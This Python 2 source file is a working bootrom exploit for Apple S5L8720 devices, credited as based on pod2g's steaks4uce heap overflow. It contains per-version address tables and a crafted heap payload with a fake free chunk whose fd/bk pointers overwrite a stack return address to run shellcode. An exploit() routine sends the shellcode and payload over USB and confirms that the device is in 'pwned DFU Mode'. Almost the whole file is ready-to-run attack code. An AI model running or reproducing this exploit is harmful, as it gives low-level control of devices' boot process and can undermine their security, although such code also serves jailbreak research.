# Credit: This file is based on steaks4uce exploit (heap overflow) by pod2g.

import struct, sys, time
import usb # pyusb: use 'pip install pyusb' to install this module
import dfu

constants_240_4 = [
    0x22030000, #  1 - MAIN_STACK_ADDRESS
        0x3af5, #  2 - nor_power_on
        0x486d, #  3 - nor_init
        0x6c81, #  4 - usb_destroy
        0x1059, #  5 - usb_shutdown
         0x560, #  6 - invalidate_instruction_cache
    0x2202d800, #  7 - RELOCATE_SHELLCODE_ADDRESS
         0x200, #  8 - RELOCATE_SHELLCODE_SIZE
        0x795c, #  9 - memmove
         0x534, # 10 - clean_data_cache
         0x280, # 11 - gVersionString
        0x83cd, # 12 - strlcat
        0x30e9, # 13 - usb_wait_for_image
    0x22000000, # 14 - LOAD_ADDRESS
       0x24000, # 15 - MAX_SIZE
    0x220241ac, # 16 - gLeakingDFUBuffer
        0x1955, # 17 - free
    0x65786563, # 18 - EXEC_MAGIC
        0x1bf1, # 19 - memz_create
        0x3339, # 20 - jump_to
        0x1c19, # 21 - memz_destroy
          0x58, # 22 - IMAGE3_LOAD_SP_OFFSET
          0x54, # 23 - IMAGE3_LOAD_STRUCT_OFFSET
        0x1c5d, # 24 - image3_create_struct
        0x22cd, # 25 - image3_load_continue
        0x23a3, # 26 - image3_load_fail
]

constants_240_5_1 = [
    0x22030000, #  1 - MAIN_STACK_ADDRESS
        0x3afd, #  2 - nor_power_on
        0x4875, #  3 - nor_init
        0x6c89, #  4 - usb_destroy
        0x1059, #  5 - usb_shutdown
         0x560, #  6 - invalidate_instruction_cache
    0x2202d800, #  7 - RELOCATE_SHELLCODE_ADDRESS
         0x200, #  8 - RELOCATE_SHELLCODE_SIZE
        0x7964, #  9 - memmove
         0x534, # 10 - clean_data_cache
         0x280, # 11 - gVersionString
        0x83d5, # 12 - strlcat
        0x30f1, # 13 - usb_wait_for_image
    0x22000000, # 14 - LOAD_ADDRESS
       0x24000, # 15 - MAX_SIZE
    0x220241ac, # 16 - gLeakingDFUBuffer
        0x1955, # 17 - free
    0x65786563, # 18 - EXEC_MAGIC
        0x1bf9, # 19 - memz_create
        0x3341, # 20 - jump_to
        0x1c21, # 21 - memz_destroy
          0x58, # 22 - IMAGE3_LOAD_SP_OFFSET
          0x54, # 23 - IMAGE3_LOAD_STRUCT_OFFSET
        0x1c65, # 24 - image3_create_struct
        0x22d5, # 25 - image3_load_continue
        0x23ab, # 26 - image3_load_fail
]

class DeviceConfig:
  def __init__(self, version, constants):
    self.version = version
    self.constants = constants

configs = [
  DeviceConfig('240.4',   constants_240_4),   # S5L8720 (old bootrom)
  DeviceConfig('240.5.1', constants_240_5_1), # S5L8720 (new bootrom)
]

# Pad to length 256 and add heap data for overwrite
payload = '\x00' * 256 + struct.pack('<14I',
              # 1. Allocated chunk to be freed
              # Chunk header: (size 0x8)
        0x84, #   0x00: previous_chunk
         0x5, #   0x04: next_chunk
              # Contents: (requested size 0x1c, allocated size 0x20)
        0x80, #   0x08: buffer[0] - direction
  0x22026280, #   0x0c: buffer[1] - usb_response_buffer
  0xffffffff, #   0x10: buffer[2]
       0x138, #   0x14: buffer[3] - size of payload in bytes
       0x100, #   0x18: buffer[4]
         0x0, #   0x1c: buffer[5]
         0x0, #   0x20: buffer[6]
         0x0, #   0x24: unused
              # 2. Fake free chunk
              # Chunk header: (size 0x8)
        0x15, #   0x28: previous_chunk
         0x2, #   0x2c: next_chunk
              # Attack fd/bk pointers in this free chunk for arbitrary write:
  0x22000001, #   0x30: fd - shellcode_address (what to write)
  0x2202d7fc, #   0x34: bk - exception_irq() LR on the stack (where to write it)
)

def generate_shellcode(constants):
  with open('bin/steaks4uce-shellcode.bin', 'rb') as f:
    shellcode = f.read()

  # Shellcode has placeholder values for constants; check they match and replace with constants from config
  placeholders_offset = len(shellcode) - 4 * len(constants)
  for i in range(len(constants)):
    offset = placeholders_offset + 4 * i
    (value,) = struct.unpack('<I', shellcode[offset:offset + 4])
    assert value == 0xBAD00001 + i

  return shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)

def exploit():
  print '*** based on steaks4uce exploit (heap overflow) by pod2g ***'

  device = dfu.acquire_device()
  print 'Found:', device.serial_number

  if 'PWND:[' in device.serial_number:
    print 'Device is already in pwned DFU Mode. Not executing exploit.'
    return

  if 'CPID:8720' not in device.serial_number:
    print 'ERROR: Not a compatible device. This exploit is for S5L8720 devices only. Exiting.'
    sys.exit(1)

  chosenConfig = None
  for config in configs:
    if 'SRTG:[iBoot-%s]' % config.version in device.serial_number:
      chosenConfig = config
      break

  if chosenConfig is None:
    print 'ERROR: CPID is compatible, but serial number string does not match.'
    print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
    sys.exit(1)

  dfu.reset_counters(device)
  dfu.send_data(device, generate_shellcode(chosenConfig.constants))
  dfu.send_data(device, payload)
  assert len(device.ctrl_transfer(0xA1, 1, 0, 0, len(payload), 1000)) == len(payload)
  dfu.release_device(device)

  time.sleep(0.01)

  device = dfu.acquire_device()
  dfu.usb_reset(device)
  dfu.release_device(device)

  device = dfu.acquire_device()
  failed = 'PWND:[steaks4uce]' not in device.serial_number
  dfu.release_device(device)

  if failed:
    print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
    sys.exit(1)

  print 'Device is now in pwned DFU Mode.'
